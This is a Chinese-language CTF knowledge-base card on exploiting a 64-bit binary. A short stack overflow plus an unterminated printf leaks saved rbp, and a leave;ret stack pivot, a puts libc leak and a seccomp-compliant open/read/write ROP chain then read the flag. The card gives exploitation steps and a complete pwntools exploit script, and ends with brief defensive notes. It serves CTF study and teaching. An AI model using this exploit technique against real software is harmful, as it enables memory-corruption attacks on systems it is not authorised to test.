---
id: binary-pwn-stack-0x10-overflow-printf-rbp-leak-leave-ret-orw
title: 0x10 溢出 + 未截断 printf 泄漏 saved rbp：leave;ret 迁回栈缓冲区分段 ROP，seccomp ORW 读 flag
type: scenario
domain: binary
path: binary/pwn/stack
technique: short-overflow-printf-rbp-leak-leave-ret-orw
aliases:
- 0x10 栈溢出
- printf %s 泄漏 saved rbp
- leave ret 迁回栈
- seccomp ORW 读 flag
- 短溢出栈迁移
tags:
- pwn
- stack-overflow
- stack-pivot
- leave-ret
- seccomp
- orw
- libc-leak
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V432
  verified_at: '2026-11-09T19:17:24+08:00'
  notes: 已对照原文 stack 题及 17 张图核对：buf[320]+read 0x150、printf(%s) 未截断、首轮 a*(0x140-8)+aaaaaaab 泄漏 saved rbp、stack=rbp-0x150、leave;ret 迁栈、puts 泄 libc、seccomp 仅 read/write/open/exit 的 ORW 三段链均与原文 exp/截图 04-09 一致，flag{1284f528-...} 实测输出吻合。未给版本，已 clear。dedup 与 32 位 2 字节溢出卡、BSS 迁移卡等仅 related。worker 跳过判断：orange 与既有 House of Orange/FSOP 卡同链；摩登pwn 属 32 位符号位/回绕类已有覆盖；卡死欧计算器原文未解释后门逻辑与 payload 原理，跳过成立。
---

## 一句话结论

当 `read(0, buf, n+0x10)` 只能覆盖 saved rbp 与返回地址、且随后有 `printf("%s", buf)` 时，先填满 buf 不留 NUL，让 `%s` 越界打印出 saved rbp 的栈地址；再用该地址做 leave;ret 栈迁移回到栈上缓冲区的 ROP 链，先 puts 泄 libc，再在 seccomp 只允许 open/read/write/exit 的环境下构造 ORW 读出 flag。

## 原理

- **漏洞形态**：`char buf[320]`（0x140）后 `read(0, buf, 0x150)`，多出 0x10 字节，恰好覆盖 saved rbp 和返回地址，放不下完整 ROP 链；随后 `printf("%s", buf)` 输出缓冲区。
- **泄漏 saved rbp**：第一轮发送 `0x140` 字节且末尾 8 字节为非 NUL 标记（如 `aaaaaaab`），缓冲区无终止符，`%s` 会继续打印栈上内容，直到遇到 NUL；从输出中标记之后读取 6 字节即得到原 saved rbp（栈地址，高两字节为 0），据此算出缓冲区地址（如 rbp-0x150）。
- **栈迁移**：第二轮 payload 在缓冲区开头布置 `[p64(stack)] + pop_rdi + puts@got + puts@plt + 重新进入读函数的地址`，补齐到 0x140，最后 0x10 字节写 `p64(stack) + leave_ret`。函数返回时 leave 把 rbp 设为 stack，ret 跳到 leave_ret；第二次 leave 以 stack 为帧基址，ret 从缓冲区首 qword 之后的链开始执行。
- **泄 libc**：链首的 `p64(stack)` 被 leave 的 pop rbp 消耗，随后 `pop rdi; ret` 取 puts@got，`puts@plt` 输出 libc 地址；返回地址再指向函数内的读取点，等待第三段 payload。
- **ORW**：seccomp 仅放行 `read/write/open/exit`（execve 被杀），第三段按 `open("./flag") → read(fd=3, bss) → write(1, bss, 0x100)` 构造 ROP，gadget 从 libc 中按泄露基址取 `pop rdi/rsi/rdx`。
- **为什么分三段**：每轮输入长度与已泄露信息决定下一轮布局；短溢出无法直接放全链，只能靠 leave;ret 把执行流迁回可写缓冲区，再用函数内读取点反复读入下一段。

## 触发条件

- 64 位程序存在 `read` 长度 = 缓冲区 + 0x10 的短溢出，且溢出后紧跟 `printf("%s", buf)` 或类似可越界输出；
- 缓冲区位于栈上且可在后续轮次写入完整链；存在 leave;ret gadget；
- 程序启用 seccomp 且只允许 open/read/write/exit（或目标 flag 需用 ORW 读取）；
- 能获得 libc 版本（本题 libc-2.23）用于计算 open/read/write 与 pop 寄存器 gadget。

## 利用步骤

1. 第一轮发送 `b'a'*(0x140-8)+b'aaaaaaab'`，接收输出到 `aaaaaaab`，再读 6 字节并补 0 得到 saved rbp；计算 `stack = rbp - 0x150`。
2. 第二轮发送 `p64(stack)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(reenter)` 补齐 0x140，追加 `p64(stack)+p64(leave_ret)`。
3. 接收 puts 输出，解析 6 字节得到 libc 地址；计算 libc base、open/read/write、pop rdi/rsi/rdx。
4. 第三轮构造 `"./flag\0"` + `pop rdi; stack-0x140`（或 bss）+ `pop rsi; 0` + open + `pop rdi; 3` + `pop rsi; bss` + `pop rdx; 0x100` + read + `pop rdi; 1` + `pop rsi; bss` + `pop rdx; 0x100` + write，补齐后同样 `p64(buf)+leave_ret` 迁栈。
5. 交互读取 flag（原文得到 `flag{1284f528-d951-4471-a7aa-01d636b2d143}`）。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64')
io = process('./pwn')
elf = ELF('./pwn'); libc = ELF('./libc-2.23.so')
pop_rdi, leave_ret, reenter = 0x400b93, 0x400a74, 0x400AEF

io.recvuntil(b'please enter your content:\n')
io.send(b'a'*(0x140-8)+b'aaaaaaab')
io.recvuntil(b'aaaaaaab')
rbp = u64(io.recv(6).ljust(8, b'\x00')); stack = rbp-0x150

payload = (p64(stack)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(reenter)).ljust(0x140, b'\x00')+p64(stack)+p64(leave_ret)
io.recvuntil(b'again:\n'); io.send(payload)
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['puts']

rop  = b'./flag\x00\x00'
rop += p64(pop_rdi)+p64(stack-0x140)+p64(libc.sym['open'])
rop += p64(pop_rdi)+p64(3)+p64(libc.search(asm('pop rsi; ret')).__next__())+p64(elf.bss()+0x100)
rop += p64(libc.search(asm('pop rdx; ret')).__next__())+p64(0x100)+p64(libc.sym['read'])
rop += p64(pop_rdi)+p64(1)+p64(libc.search(asm('pop rsi; ret')).__next__())+p64(elf.bss()+0x100)
rop += p64(libc.search(asm('pop rdx; ret')).__next__())+p64(0x100)+p64(libc.sym['write'])
io.send(rop.ljust(0x140, b'\x00')+p64(stack-0x140)+p64(leave_ret))
io.interactive()
```

## 变体与关联

- 变体：无 `printf` 泄漏时可用其它输出/异常路径泄 rbp；无栈上可写链时可把链迁到 BSS（见 [[binary-pwn-stack-pivot-leave-ret-bss]]、[[binary-pwn-stack-lea-rax-rbp-buf-short-read-bss-migration-orw]]）。
- 变体：seccomp 放行 execve 时可直接 system/one_gadget；本题必须 ORW。
- 关联：[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（seccomp ORW 下的栈帧校验绕过与迁移）、[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]（短读 BSS 迁移分块 ORW）。

## 检测与防御

- 开发侧：`read` 长度严格等于缓冲区大小，输出使用 `printf("%s")` 且保证缓冲区 NUL 结尾；启用 seccomp 时仍需防止 ORW 读取敏感文件。
- CTF 侧：拿到短溢出先找输出函数能否越界泄漏 saved rbp/canary，再决定栈迁移目标；远端 libc 与本地不同会导致偏移失败，需泄漏后计算。
- 检测：异常长的栈输出、连续多段 ROP 读取、进程被 seccomp 限制后仍读取 flag 文件的行为。
